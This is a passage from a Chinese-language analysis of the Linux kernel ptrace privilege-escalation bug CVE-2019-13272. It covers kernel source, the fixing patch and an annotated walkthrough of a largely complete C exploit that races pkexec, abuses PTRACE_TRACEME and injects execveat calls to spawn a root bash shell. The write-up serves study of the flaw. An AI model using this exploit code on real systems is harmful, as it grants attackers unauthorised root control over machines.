task A \u4f7f\u7528 PTRACE_ATTACH \u5efa\u7acb\u8ddf B \u7684 trace link, A \u548c B \u90fd\u662f\u666e\u901a\u6743\u9650, \u4e4b\u540e A \u53ef\u4ee5\u63a7\u5236 B \u6267\u884c\u4efb\u4f55\u64cd\u4f5c\n\n\n\u7b2c 9 \u6b65\uff0c task B \u63a7\u5236 task C \u6267\u884c\u63d0\u6743\u64cd\u4f5c\n\n\n\n\n\u524d\u9762 8 \u6b65\uff0c\u4f9d\u636e\u4e4b\u524d\u7684\u4ee3\u7801\u5206\u6790\u90fd\u662f\u6210\u7acb\u7684\uff0c\u90a3\u4e48\u7b2c 9 \u6b65\u80fd\u4e0d\u80fd\u6210\u7acb\u5462?\n\n\n\u6267\u884c\u7b2c 9 \u6b65\u65f6\uff0c task B \u672c\u8eab\u662f\u666e\u901a\u6743\u9650\uff0c task C \u7684 euid \u662f root \u6743\u9650\uff0c B \u548c C \u7684 trace link \u6709\u6548, \u8fd9\u79cd\u6761\u4ef6\u4e0b B \u80fd\u4e0d\u80fd\u53d1\u9001 ptrace request \u8ba9 C \u6267\u884c\u5404\u79cd\u64cd\u4f5c\uff0c\u5305\u62ec\u63d0\u6743\u64cd\u4f5c? \n\n\n\u4e0b\u9762\u6211\u4eec\u7ed3\u5408\u4ee3\u7801\u5206\u6790\u8fd9\u4e2a\u95ee\u9898\n\n\n\n    1111 SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr,\n    1112                 unsigned long, data)\n    1113 {\n    1114         struct task_struct *child;\n    1115         long ret;\n    1116 \n    1117         if (request == PTRACE_TRACEME) {\n    1118                 ret = ptrace_traceme(); // <----- \u8fdb\u5165 traceme \u5206\u652f\n    1119                 if (!ret)\n    1120                         arch_ptrace_attach(current);\n    1121                 goto out;\n    1122         }\n    1123 \n    1124         child = find_get_task_by_vpid(pid);\n    1125         if (!child) {\n    1126                 ret = -ESRCH;\n    1127                 goto out;\n    1128         }\n    1129 \n    1130         if (request == PTRACE_ATTACH || request == PTRACE_SEIZE) {\n    1131                 ret = ptrace_attach(child, request, addr, data); // <------ \u8fdb\u5165 attach \u5206\u652f\n    1132                 /*\n    1133                  * Some architectures need to do book-keeping after\n    1134                  * a ptrace attach.\n    1135                  */\n    1136                 if (!ret)\n    1137                         arch_ptrace_attach(child);\n    1138                 goto out_put_task_struct;\n    1139         }\n    1140 \n    1141         ret = ptrace_check_attach(child, request == PTRACE_KILL ||\n    1142                                   request == PTRACE_INTERRUPT);\n    1143         if (ret < 0)\n    1144                 goto out_put_task_struct;\n    1145 \n    1146         ret = arch_ptrace(child, request, addr, data); // <---- \u5176\u4ed6 ptrace request \n    1147         if (ret || request != PTRACE_DETACH)\n    1148                 ptrace_unfreeze_traced(child);\n    1149 \n    1150  out_put_task_struct:\n    1151         put_task_struct(child);\n    1152  out:\n    1153         return ret;\n    1154 }\n\n\n\n\n\n\u5982\u4e0a\uff0c \u7531\u4e8e task B \u548c task C \u6b64\u65f6\u5df2\u7ecf\u5b58\u5728 trace link\uff0c \u6240\u4ee5\u901a\u8fc7 B \u5411 C \u53ef\u4ee5\u76f4\u63a5\u53d1\u9001 ptrace request\uff0c \u5c06\u8fdb\u5165\u51fd\u6570 arch_ptrace\n\n\narch/x86/kernel/ptrace.c\n\narch_ptrace \n    -> ptrace_request \n        -> generic_ptrace_peekdata\n           generic_ptrace_pokedata \n            -> ptrace_access_vm \n                -> ptracer_capable \n\n kernel/ptrace.c\n 884 int ptrace_request(struct task_struct *child, long request,\n 885                    unsigned long addr, unsigned long data)\n 886 {\n 887         bool seized = child->ptrace & PT_SEIZED;\n 888         int ret = -EIO;\n 889         siginfo_t siginfo, *si;\n 890         void __user *datavp = (void __user *) data;\n 891         unsigned long __user *datalp = datavp;\n 892         unsigned long flags;\n 893 \n 894         switch (request) {\n 895         case PTRACE_PEEKTEXT:\n 896         case PTRACE_PEEKDATA:\n 897                 return generic_ptrace_peekdata(child, addr, data);\n 898         case PTRACE_POKETEXT:\n 899         case PTRACE_POKEDATA:\n 900                 return generic_ptrace_pokedata(child, addr, data);\n 901 \n =================== skip ================\n 1105 }\n\n\n 1156 int generic_ptrace_peekdata(struct task_struct *tsk, unsigned long addr,\n 1157                             unsigned long data)\n 1158 {\n 1159         unsigned long tmp;\n 1160         int copied;\n 1161 \n 1162         copied = ptrace_access_vm(tsk, addr, &tmp, sizeof(tmp), FOLL_FORCE); // <--- \u8c03\u7528 ptrace_access_vm\n 1163         if (copied != sizeof(tmp))\n 1164                 return -EIO;\n 1165         return put_user(tmp, (unsigned long __user *)data);\n 1166 }\n 1167 \n 1168 int generic_ptrace_pokedata(struct task_struct *tsk, unsigned long addr,\n 1169                             unsigned long data)\n 1170 {\n 1171         int copied;\n 1172 \n 1173         copied = ptrace_access_vm(tsk, addr, &data, sizeof(data), // <---- \u8c03\u7528 ptrace_access_vm\n 1174                         FOLL_FORCE | FOLL_WRITE);\n 1175         return (copied == sizeof(data)) ? 0 : -EIO;\n 1176 }\n\n\n\n\n\n\n\u5982\u4e0a\uff0c\u5f53 tracer \u60f3\u8981\u63a7\u5236 tracee \u6267\u884c\u65b0\u7684\u4ee3\u7801\u903b\u8f91\u65f6\uff0c\u9700\u8981\u53d1\u9001 request \u8bfb\u5199 tracee \u7684\u4ee3\u7801\u533a\u548c\u5185\u5b58\u533a\uff0c \u5bf9\u5e94\u7684 request \u662f PTRACE_PEEKTEXT / PTRACE_PEEKDATA / PTRACE_POKETEXT / PTRACE_POKEDATA \n\n\n\u8fd9\u51e0\u79cd\u8bfb\u5199\u64cd\u4f5c\u6700\u7ec8\u90fd\u662f\u901a\u8fc7\u51fd\u6570 ptrace_access_vm \u5b9e\u73b0\u7684\n\n\n    kernel/ptrace.c\n    38 int ptrace_access_vm(struct task_struct *tsk, unsigned long addr,\n    39                      void *buf, int len, unsigned int gup_flags)\n    40 {\n    41         struct mm_struct *mm;\n    42         int ret;\n    43 \n    44         mm = get_task_mm(tsk);\n    45         if (!mm)\n    46                 return 0;\n    47 \n    48         if (!tsk->ptrace ||\n    49             (current != tsk->parent) ||\n    50             ((get_dumpable(mm) != SUID_DUMP_USER) &&\n    51              !ptracer_capable(tsk, mm->user_ns))) { // < ----- \u53c8\u662f\u8c03\u7528 ptracer_capable \u51fd\u6570\n    52                 mmput(mm);\n    53                 return 0;\n    54         }\n    55 \n    56         ret = __access_remote_vm(tsk, mm, addr, buf, len, gup_flags);\n    57         mmput(mm);\n    58 \n    59         return ret;\n    60 }\n\n    kernel/capability.c\n    499 bool ptracer_capable(struct task_struct *tsk, struct user_namespace *ns)\n    500 {\n    501         int ret = 0;  /* An absent tracer adds no restrictions */\n    502         const struct cred *cred;\n    503         rcu_read_lock();\n    504         cred = rcu_dereference(tsk->ptracer_cred);\n    505         if (cred)\n    506                 ret = security_capable_noaudit(cred, ns, CAP_SYS_PTRACE);\n    507         rcu_read_unlock();\n    508         return (ret == 0);\n    509 }\n\n\n\n\n\u5982\u4e0a\uff0c ptrace_access_vm \u51fd\u6570\u4f1a\u8c03\u7528\u6211\u4eec\u4e4b\u524d\u5206\u6790\u5230\u7684 'ptracer_capable' \u6765\u51b3\u5b9a\u8fd9\u4e2a request \u662f\u5426\u53ef\u4ee5\u8fdb\u884c, \u8fd9\u662f 'ptracer_capable' \u51fd\u6570\u7684\u7b2c\u4e8c\u79cd\u4f7f\u7528\u573a\u666f\n\n\n\u6839\u636e\u4e4b\u524d\u6211\u4eec\u5206\u6790\u7684\u7ed3\u679c\uff0c task C \u6b64\u65f6\u4fdd\u5b58\u7684 ptracer_cred \u662f\u7279\u6743 cred, \u6240\u4ee5\u8fd9\u65f6\u5019 ptracer_capable \u4f1a\u901a\u8fc7\uff0c \u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u56de\u7b54\u4e86\u521a\u521a\u7684\u95ee\u9898\uff0c \u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u666e\u901a\u6743\u9650\u7684 task B \u662f\u53ef\u4ee5\u53d1\u9001 ptrace request \u53bb\u8bfb\u5199 root \u6743\u9650\u7684 task C \u7684\u5185\u5b58\u533a\u548c\u4ee3\u7801\u533a\u7684\n\n\n\u81f3\u6b64\uff0ctask C \u8bb0\u5f55\u7684\u8fd9\u4e2a\u7279\u6743 ptracer_cred \u5b9e\u9645\u4e0a\u53d1\u6325\u4e86 2 \u79cd\u4f5c\u7528\n\n\n\n\n1\uff0c\u53ef\u4ee5\u8ba9 task C \u6267\u884c execve(suid binary) \u7ed9\u81ea\u5df1\u63d0\u6743\n\n\n2\uff0c\u53ef\u4ee5\u8ba9\u666e\u901a\u6743\u9650\u7684 task B \u6267\u884c ptrace \u8bfb\u5199 task C \u7684\u4ee3\u7801\u533a\u548c\u5185\u5b58\u533a\uff0c\u4ece\u800c\u63a7\u5236 task C \u6267\u884c\u4efb\u610f\u64cd\u4f5c\n\n\n\n\n\u4e0a\u9762 2 \u70b9\u5408\u8d77\u6765\uff0c\u4e0d\u5c31\u662f\u5b8c\u6574\u7684\u63d0\u6743\u64cd\u4f5c\u5417?\n\n\nc.\u6f0f\u6d1e\u7c7b\u578b\n\n\nTOCTOU\n\n\nd.\u6f0f\u6d1e\u8865\u4e01\n\n\nptrace: Fix ->ptracer_cred handling for PTRACE_TRACEME\n\n\nFix two issues:\n\n// \u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u662f cred \u7684 rcu reference \u95ee\u9898\nWhen called for PTRACE_TRACEME, ptrace_link() would obtain an RCU   \nreference to the parent's objective credentials, then give that pointer\nto get_cred().  However, the object lifetime rules for things like\nstruct cred do not permit unconditionally turning an RCU reference into\na stable reference.\n\n// \u7b2c\u4e8c\u4e2a\u95ee\u9898\uff0ctracee \u8bb0\u5f55\u7684 tracer \u7684 cred \u7684\u95ee\u9898\nPTRACE_TRACEME records the parent's credentials as if the parent was \nacting as the subject, but that's not the case.  If a malicious\nunprivileged child uses PTRACE_TRACEME and the parent is privileged, and\nat a later point, the parent process becomes attacker-controlled\n(because it drops privileges and calls execve()), the attacker ends up\nwith control over two processes with a privileged ptrace relationship,\nwhich can be abused to ptrace a suid binary and obtain root privileges.\n\n\nFix both of these by always recording the credentials of the process\nthat is requesting the creation of the ptrace relationship:\ncurrent_cred() can't change under us, and current is the proper subject\nfor access control.\n\n\n\n\n\u4ee5\u4e0a\u662f\u8865\u4e01\u7684\u63cf\u8ff0\uff0c\u4ee5\u4e0b\u662f\u8865\u4e01\u7684\u4ee3\u7801\n\n\ndiff --git a/kernel/ptrace.c b/kernel/ptrace.c\nindex 8456b6e..705887f 100644\n--- a/kernel/ptrace.c\n+++ b/kernel/ptrace.c\n@@ -79,9 +79,7 @@ void __ptrace_link(struct task_struct *child, struct task_struct *new_parent,\n  */\n static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)\n {\n-   rcu_read_lock();\n-   __ptrace_link(child, new_parent, __task_cred(new_parent));\n-   rcu_read_unlock();\n+   __ptrace_link(child, new_parent, current_cred());\n }\n\n\n\n\n\u4ece\u8865\u4e01\u7684\u63cf\u8ff0\u6765\u770b\uff0c\u4e00\u5171\u4fee\u590d\u4e86 2 \u4e2a\u95ee\u9898\n\n\n\n\n1 \u662f rcu reference \u7684\u95ee\u9898\uff0c\u5bf9\u5e94\u7684\u4ee3\u7801\u662f\u5220\u9664\u4e86 rcu \u9501; \n\n\n2 \u662f tracee \u8bb0\u5f55 tracer \u8fdb\u7a0b\u7684 cred \u5f15\u53d1\u7684\u95ee\u9898\n\n\n\n\n\u672c\u6587\u4e0d\u5173\u5fc3\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u53ea\u5206\u6790\u53ef\u4ee5\u7528\u4e8e\u672c\u5730\u63d0\u6743\u7684\u7b2c\u4e8c\u4e2a\u95ee\u9898\n\n\n\u4ece\u8865\u4e01\u63cf\u8ff0\u770b\u7b2c\u4e8c\u4e2a\u95ee\u9898\u6bd4\u8f83\u590d\u6742\uff0c\u8865\u4e01\u5bf9\u5e94\u7684\u4ee3\u7801\u5012\u662f\u975e\u5e38\u7b80\u5355\uff0c \u5c06 '__task_cred(new_parent)' \u6362\u6210\u4e86 'current_cred()', \u4e5f\u5c31\u662f\u8bf4\u8bb0\u5f55\u7684 cred \u4ece tracer \u8fdb\u7a0b\u7684 cred \u6362\u6210\u4e86\u5f53\u524d\u8fdb\u7a0b\u7684 cred\n\n\n\u8865\u4e01\u7684\u610f\u601d\u662f\u8bf4\u5728 PTRACE_TRACEME \u8fd9\u79cd\u573a\u666f\u4e0b\uff0c ptracer_cred \u8bb0\u5f55\u7684\u4e0d\u5e94\u8be5\u662f\u7236\u8fdb\u7a0b\u7684 cred\uff0c \u800c\u5e94\u8be5\u662f\u81ea\u5df1\u7684 cred, \u8fd9\u6837\u903b\u8f91\u624d\u662f\u5bf9\u7684\n\n\ne.\u6f0f\u6d1eCVE\u53f7\n\n\nCVE-2019-13272\n\n\n3.POC\n\n\na.POC\u539f\u7406\n\n\nb.POC\u6e90\u7801\n\n\nc.\u590d\u73b0\u6b65\u9aa4\n\n\n4.EXP\n\n\na.EXP\u539f\u7406\n\n\n\u672c\u6f0f\u6d1e\u5229\u7528\u7684\u5173\u952e\u662f\u627e\u5230\u5408\u9002\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\u542f\u52a8 task B, \u8fd9\u4e2a\u53ef\u6267\u884c\u7a0b\u5e8f\u8981\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6:\n\n\n\n\n1, \u5fc5\u987b\u662f\u80fd\u88ab\u666e\u901a\u6743\u9650\u7528\u6237\u8c03\u7528\n\n\n2, \u6267\u884c\u65f6\u5fc5\u987b\u6709\u63d0\u6743\u5230root\u7684\u9636\u6bb5\n\n\n3, \u6267\u884c\u63d0\u6743\u540e\u5fc5\u987b\u6267\u884c\u964d\u6743\n\n\n\n\n(\u77ed\u6682\u63d0\u6743\u5230 root \u7684\u76ee\u7684\u662f\u8ba9 task C \u53ef\u4ee5\u83b7\u53d6 root \u7684 ptracer_cred, \u518d\u964d\u6743\u7684\u76ee\u7684\u662f\u8ba9 B \u80fd\u88ab\u666e\u901a\u6743\u9650\u7684\u8fdb\u7a0b ptrace attach)\n\n\npkexec\n \u5141\u8bb8\u7279\u6743\u7528\u6237\u4ee5\u5176\u4ed6\u7528\u6237\u6743\u9650\u6267\u884c\u53e6\u5916\u4e00\u4e2a\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c \u7528\u4e8e \npolkit\n \u8ba4\u8bc1\u6846\u67b6, \u5f53\u4f7f\u7528 --user \u53c2\u6570\u65f6\uff0c \u521a\u597d\u53ef\u4ee5\u8ba9\u8fdb\u7a0b\u5148\u63d0\u6743\u5230  root \u7136\u540e\u518d\u964d\u6743\u5230\u6307\u5b9a\u7528\u6237\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528\u4e8e\u6784\u5efa\u8fdb\u7a0b B, \u6b64\u5916\u9700\u8981\u627e\u5230\u901a\u8fc7 polkit \u6846\u67b6\u6267\u884c\u7684\u53ef\u6267\u884c\u7a0b\u5e8f(jann horn \u628a\u4ed6\u4eec\u6210\u4e3a helper)\uff0c \u8fd9\u4e9b helper \u7a0b\u5e8f\u9700\u8981\u6ee1\u8db3\u666e\u901a\u7528\u6237\u7528 pkexec \u6267\u884c\u5b83\u4eec\u65f6\u4e0d\u9700\u8981\u8ba4\u8bc1\uff08\u5f88\u591a\u901a\u8fc7 polkit \u6267\u884c\u7684\u7a0b\u5e8f\u90fd\u9700\u8981\u5f39\u7a97\u8ba4\u8bc1\uff09, \u6267\u884c\u7684\u6a21\u5f0f\u5982\u4e0b:\n\n\n\n\n/usr/bin/pkexec --user nonrootuser /user/sbin/some-helper-binary\n\n\n\n\nb.EXP\u6e90\u7801\n\n\n\u8fd9\u91cc\u6211\u5217\u51fa 3 \u4efd exploit \u4ee3\u7801:\n\n\n\n\n1 \njann horn \u7684 exploit\n \n\n\n2 \nbcoles \u7684 exploit\n \n\n\n3 \njiayy \u7684 exploit\n\n\n\n\njann horn \u7684 exploit\n \u91cc\u4f7f\u7528\u684c\u9762\u53d1\u884c\u7248\u81ea\u5e26\u7684 \npkexec\n \u7a0b\u5e8f\u7528\u4e8e\u542f\u52a8 task B\n\n\npkexec\n \u5141\u8bb8\u7279\u6743\u7528\u6237\u4ee5\u5176\u4ed6\u7528\u6237\u6743\u9650\u6267\u884c\u53e6\u5916\u4e00\u4e2a\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c \u7528\u4e8e \npolkit\n \u8ba4\u8bc1\u6846\u67b6, \u5f53\u4f7f\u7528 --user \u53c2\u6570\u65f6\uff0c \u521a\u597d\u53ef\u4ee5\u8ba9\u8fdb\u7a0b\u5148\u63d0\u6743\u5230  root \u7136\u540e\u518d\u964d\u6743\u5230\u6307\u5b9a\u7528\u6237\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528\u4e8e\u6784\u5efa\u8fdb\u7a0b B, \u6b64\u5916\u9700\u8981\u627e\u5230\u901a\u8fc7 polkit \u6846\u67b6\u6267\u884c\u7684\u53ef\u6267\u884c\u7a0b\u5e8f(jann horn \u628a\u4ed6\u4eec\u6210\u4e3a helper)\uff0c \u8fd9\u4e9b helper \u7a0b\u5e8f\u9700\u8981\u6ee1\u8db3\u666e\u901a\u7528\u6237\u7528 pkexec \u6267\u884c\u5b83\u4eec\u65f6\u4e0d\u9700\u8981\u8ba4\u8bc1\uff08\u5f88\u591a\u901a\u8fc7 polkit \u6267\u884c\u7684\u7a0b\u5e8f\u90fd\u9700\u8981\u5f39\u7a97\u8ba4\u8bc1\uff09, \u6267\u884c\u7684\u6a21\u5f0f\u5982\u4e0b:\n\n\n\n\n/usr/bin/pkexec --user nonrootuser /user/sbin/some-helper-binary\n\n\n\n\nbcoles \u7684 exploit\n \u5728 jann horn \u7684\u57fa\u7840\u4e0a\u589e\u52a0\u4e86\u5bfb\u627e\u66f4\u591a helper binary \u7684\u4ee3\u7801\uff0c \u56e0\u4e3a jann horn \u7684 helper \u662f\u4e00\u4e2a\u5199\u6b7b\u7684\u7a0b\u5e8f\uff0c \u5728\u5f88\u591a\u53d1\u884c\u7248\u5e76\u4e0d\u5b58\u5728\uff0c\u6240\u4ee5\u4ed6\u7684 exploit \u5728\u5f88\u591a\u53d1\u884c\u7248\u7cfb\u7edf\u4e0a\u65e0\u6cd5\u8fd0\u884c\uff0c bcoles \u7684 exploit \u53ef\u4ee5\u5728\u66f4\u591a\u7684\u53d1\u884c\u7248\u4e0a\u8fd0\u884c\u6210\u529f\n\n\n\u672c\u4eba\u51fa\u4e8e\u5b66\u4e60\u7684\u76ee\u7684\uff0c\u4e5f\u5199\u4e86\u4e00\u4efd \njiayy \u7684 exploit\n, \u56e0\u4e3a helper binary \u56e0\u4e0d\u540c\u53d1\u884c\u7248\u800c\u5f02\uff0c pkexec \u4e5f\u662f\u684c\u9762\u53d1\u884c\u7248\u624d\u6709\uff0c \u800c\u4e8b\u5b9e\u4e0a\u8fd9\u4e2a\u63d0\u6743\u6f0f\u6d1e\u662f linux kernel \u7684\u6f0f\u6d1e\uff0c \u6240\u4ee5\u6211\u628a jann horn \u7684 exploit \u6539\u6210\u4e86\u4f7f\u7528\u4e00\u4e2a fakepkexec \u7a0b\u5e8f\u6765\u63d0\u6743\uff0c \u800c\u8fd9\u4e2a fakepkexec \u548c fakehelper \u7a0b\u5e8f\u624b\u52a8\u751f\u6210\uff08\u800c\u4e0d\u662f\u4ece\u76ee\u6807\u7cfb\u7edf\u641c\u7d22\uff09\uff0c\u8fd9\u6837\u4e00\u6765\u5b66\u4e60\u8005\u53ef\u4ee5\u5728\u4efb\u4f55\u5b58\u5728\u672c\u6f0f\u6d1e\u7684 linux \u7cfb\u7edf\uff08\u4e0d\u9700\u8981\u684c\u9762\uff09\u8fd0\u884c\u6211\u7684 exploit \u8fdb\u884c\u7814\u7a76\n\n\n\u4e0b\u9762\u7b80\u5355\u8fc7\u4e00\u4e0b exploit \u7684\u4ee3\u7801\n\n\n\n167 int main(int argc, char **argv) {\n168   if (strcmp(argv[0], \"stage2\") == 0)\n169     return middle_stage2();\n170   if (strcmp(argv[0], \"stage3\") == 0)\n171     return spawn_shell();\n172 \n173   helper_path = \"/tmp/fakehelper\";\n174 \n175   /*\n176    * set up a pipe such that the next write to it will block: packet mode,\n177    * limited to one packet\n178    */\n179   SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT));\n180   SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000));\n181   char dummy = 0;\n182   SAFE(write(block_pipe[1], &dummy, 1));\n183 \n184   /* spawn pkexec in a child, and continue here once our child is in execve() */\n185   static char middle_stack[1024*1024];\n186   pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack),\n187                             CLONE_VM|CLONE_VFORK|SIGCHLD, NULL));\n188   if (!middle_success) return 1;\n189 \n======================= skip =======================\n215 }\n\n\n\n\n\n\u5148\u770b\u884c 186, \u8c03\u7528 clone \u751f\u6210\u5b50\u8fdb\u7a0b\uff08\u4e5f\u5c31\u662f task B\uff09, task B \u8fd0\u884c middle_main \n\n\n 64 static int middle_main(void *dummy) {\n 65   prctl(PR_SET_PDEATHSIG, SIGKILL);\n 66   pid_t middle = getpid();\n 67 \n 68   self_fd = SAFE(open(\"/proc/self/exe\", O_RDONLY));\n 69 \n 70   pid_t child = SAFE(fork());\n 71   if (child == 0) {\n 72     prctl(PR_SET_PDEATHSIG, SIGKILL);\n 73 \n 74     SAFE(dup2(self_fd, 42));\n 75 \n 76     /* spin until our parent becomes privileged (have to be fast here) */\n 77     int proc_fd = SAFE(open(tprintf(\"/proc/%d/status\", middle), O_RDONLY));\n 78     char *needle = tprintf(\"\\nUid:\\t%d\\t0\\t\", getuid());\n 79     while (1) {\n 80       char buf[1000];\n 81       ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0));\n 82       buf[buflen] = '\\0';\n 83       if (strstr(buf, needle)) break;\n 84     }\n 85 \n 86     /*\n 87      * this is where the bug is triggered.\n 88      * while our parent is in the middle of pkexec, we force it to become our\n 89      * tracer, with pkexec's creds as ptracer_cred.\n 90      */\n 91     SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL));\n 92 \n 93     /*\n 94      * now we execute passwd. because the ptrace relationship is considered to\n 95      * be privileged, this is a proper suid execution despite the attached\n 96      * tracer, not a degraded one.\n 97      * at the end of execve(), this process receives a SIGTRAP from ptrace.\n 98      */\n 99     puts(\"executing passwd\");\n100     execl(\"/usr/bin/passwd\", \"passwd\", NULL);\n101     err(1, \"execl passwd\");\n102   }\n103 \n104   SAFE(dup2(self_fd, 0));\n105   SAFE(dup2(block_pipe[1], 1));\n106 \n107   struct passwd *pw = getpwuid(getuid());\n108   if (pw == NULL) err(1, \"getpwuid\");\n109 \n110   middle_success = 1;\n111   execl(\"/tmp/fakepkexec\", \"fakepkexec\", \"--user\", pw->pw_name, NULL);\n112   middle_success = 0;\n113   err(1, \"execl pkexec\");\n114 }\n\n\n\n\n\n\u884c 70, \u8c03\u7528 fork \u751f\u6210\u5b59\u8fdb\u7a0b\uff08\u4e5f\u5c31\u662f task C\uff09\n\n\n\u7136\u540e\u884c 111, task B \u8fd0\u884c fakepkexec \u8ba9\u81ea\u5df1\u63d0\u6743\u518d\u964d\u6743\n\n\n\u7136\u540e\u770b\u884c 76 ~ 84, task C \u68c0\u6d4b\u5230 task B \u7684 euid \u53d8\u6210 0 \u4e4b\u540e\uff0c \u4f1a\u6267\u884c\u884c 91 \u8fdb\u884c PTRACE_TRACEME \u64cd\u4f5c\u83b7\u53d6 root \u7684 ptracer_cred, \u7136\u540e\u7d27\u63a5\u7740 task C \u9a6c\u4e0a\u8fd0\u884c execl \u6267\u884c\u4e00\u4e2a  suid binary \u8ba9\u81ea\u5df1\u7684 euid \u53d8\u6210 0\n\n\n\n190   /*\n191    * wait for our child to go through both execve() calls (first pkexec, then\n192    * the executable permitted by polkit policy).\n193    */\n194   while (1) {\n195     int fd = open(tprintf(\"/proc/%d/comm\", midpid), O_RDONLY);\n196     char buf[16];\n197     int buflen = SAFE(read(fd, buf, sizeof(buf)-1));\n198     buf[buflen] = '\\0';\n199     *strchrnul(buf, '\\n') = '\\0';\n200     if (strncmp(buf, basename(helper_path), 15) == 0)\n201       break;\n202     usleep(100000);\n203   }\n204 \n205   /*\n206    * our child should have gone through both the privileged execve() and the\n207    * following execve() here\n208    */\n209   SAFE(ptrace(PTRACE_ATTACH, midpid, 0, NULL));\n210   SAFE(waitpid(midpid, &dummy_status, 0));\n211   fputs(\"attached to midpid\\n\", stderr);\n212 \n213   force_exec_and_wait(midpid, 0, \"stage2\");\n214   return 0;\n\n\n\n\n\n\u63a5\u4e0b\u53bb\u56de\u5230 task A \u7684 main \u51fd\u6570\uff0c \u884c 194 ~ 202, task A \u68c0\u6d4b\u5230 task B \u7684 binary comm \u53d8\u6210 helper \u4e4b\u540e\uff0c\n\u8fd0\u884c\u884c 213 \u6267\u884c force_exec_and_wait\n\n\n116 static void force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) {\n117   struct user_regs_struct regs;\n118   struct iovec iov = { .iov_base = &regs, .iov_len = sizeof(regs) };\n119   SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL));\n120   SAFE(waitpid(pid, &dummy_status, 0));\n121   SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov));\n122 \n123   /* set up indirect arguments */\n124   unsigned long scratch_area = (regs.rsp - 0x1000) & ~0xfffUL;\n125   struct injected_page {\n126     unsigned long argv[2];\n127     unsigned long envv[1];\n128     char arg0[8];\n129     char path[1];\n130   } ipage = {\n131     .argv = { scratch_area + offsetof(struct injected_page, arg0) }\n132   };\n133   strcpy(ipage.arg0, arg0);\n134   for (int i = 0; i < sizeof(ipage)/sizeof(long); i++) {\n135     unsigned long pdata = ((unsigned long *)&ipage)[i];\n136     SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long),\n137                 (void*)pdata));\n138   }\n139 \n140   /* execveat(exec_fd, path, argv, envv, flags) */\n141   regs.orig_rax = __NR_execveat;\n142   regs.rdi = exec_fd;\n143   regs.rsi = scratch_area + offsetof(struct injected_page, path);\n144   regs.rdx = scratch_area + offsetof(struct injected_page, argv);\n145   regs.r10 = scratch_area + offsetof(struct injected_page, envv);\n146   regs.r8 = AT_EMPTY_PATH;\n147 \n148   SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));\n149   SAFE(ptrace(PTRACE_DETACH, pid, 0, NULL));\n150   SAFE(waitpid(pid, &dummy_status, 0));\n151 }\n\n\n\n\n\n\u51fd\u6570 force_exec_and_wait \u7684\u4f5c\u7528\u662f\u4f7f\u7528 ptrace \u63a7\u5236 tracee \u6267\u884c execveat \u51fd\u6570\u66ff\u6362\u8fdb\u7a0b\u7684\u955c\u50cf, \u8fd9\u91cc\u5b83\u63a7\u5236 task B \u6267\u884c\u4e86 task A \u7684\u8fdb\u7a0b\uff08\u5373 exploit \u7684\u53ef\u6267\u884c\u7a0b\u5e8f\uff09\u7136\u540e\u53c2\u6570\u4e3a stage2, \u8fd9\u5b9e\u9645\u4e0a\u5c31\u662f\u8ba9 task B \u6267\u884c\u4e86 middle_stage2 \u51fd\u6570\n\n\n167 int main(int argc, char **argv) {\n168   if (strcmp(argv[0], \"stage2\") == 0)\n169     return middle_stage2();\n170   if (strcmp(argv[0], \"stage3\") == 0)\n171     return spawn_shell();\n\n\n\n\n\u800c middle_stage2 \u51fd\u6570\u540c\u6837\u8c03\u7528\u4e86 force_exec_and_wait , \u8fd9\u5c06\u4f7f task B \u5229\u7528 ptrace \u63a7\u5236 task C \u6267\u884c execveat \u51fd\u6570\uff0c\u5c06 task C \u7684\u955c\u50cf\u4e5f\u66ff\u6362\u4e3a exploit \u7684 binary, \u4e14\u53c2\u6570\u662f stage3\n\n\n153 static int middle_stage2(void) {\n154   /* our child is hanging in signal delivery from execve()'s SIGTRAP */\n155   pid_t child = SAFE(waitpid(-1, &dummy_status, 0));\n156   force_exec_and_wait(child, 42, \"stage3\");\n157   return 0;\n158 }\n\n\n\n\n\u5f53 exploit binary \u4ee5\u53c2\u6570 stage3 \u8fd0\u884c\u65f6\uff0c\u5b9e\u9645\u8fd0\u884c\u7684\u662f  spawn_shell \u51fd\u6570, \u6240\u4ee5 task C \u6700\u540e\u9636\u6bb5\u8fd0\u884c\u7684\u662f spawn_shell\n\n\n160 static int spawn_shell(void) {\n161   SAFE(setresgid(0, 0, 0));\n162   SAFE(setresuid(0, 0, 0));\n163   execlp(\"bash\", \"bash\", NULL);\n164   err(1, \"execlp\");\n165 }\n\n\n\n\n\n\u5728 spawn_shell \u51fd\u6570\u91cc\uff0c \u5b83\u9996\u5148\u4f7f\u7528 setresgid/setresuid \u5c06\u672c\u8fdb\u7a0b\u7684 real uid/effective uid/save uid \u90fd\u53d8\u6210 root, \u7531\u4e8e task C \u521a\u521a\u5df2\u7ecf\u6267\u884c\u4e86 suid binary \u5c06\u81ea\u8eab\u7684 euid \u53d8\u6210\u4e86 root, \u6240\u4ee5\u8fd9\u91cc\u7684 setresuid/setresgid \u53ef\u4ee5\u6210\u529f\u6267\u884c\uff0c\u5230\u6b64\u4e3a\u6b62\uff0c task C \u5c31\u53d8\u6210\u4e86\u4e00\u4e2a\u5b8c\u5168\u7684 root \u8fdb\u7a0b\uff0c \u6700\u540e\u518d\u6267\u884c execlp \u542f\u52a8\u4e00\u4e2a shell, \u5373\u5f97\u5230\u4e86\u4e00\u4e2a\u5b8c\u6574 root \u6743\u9650\u7684 